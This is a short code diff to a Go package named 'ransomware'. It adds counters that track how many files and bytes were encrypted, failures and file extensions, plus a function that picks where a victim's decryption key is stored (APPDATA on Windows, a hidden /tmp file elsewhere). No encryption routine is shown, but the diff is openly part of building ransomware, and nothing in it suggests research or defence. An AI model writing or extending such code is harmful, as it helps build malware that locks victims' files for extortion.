@@ -1,6 +1,7 @@
 package ransomware
 
 import (
+	"os"
 	"runtime"
 	"sync"
 	"time"
@@ -31,4 +32,17 @@ var (
 	isWindows        = runtime.GOOS == "windows"
 
 	activeChannel string
+
+	EncryptStatsFiles   int
+	EncryptStatsBytes   int64
+	EncryptStatsFailed  int
+	EncryptStatsStarted time.Time
+	encryptStatsByExt   map[string]int
 )
+
+func victimDecryptionKeyPath() string {
+	if runtime.GOOS == "windows" {
+		return os.Getenv("APPDATA") + "\\decryption_key.txt"
+	}
+	return "/tmp/.decryption_key"
+}
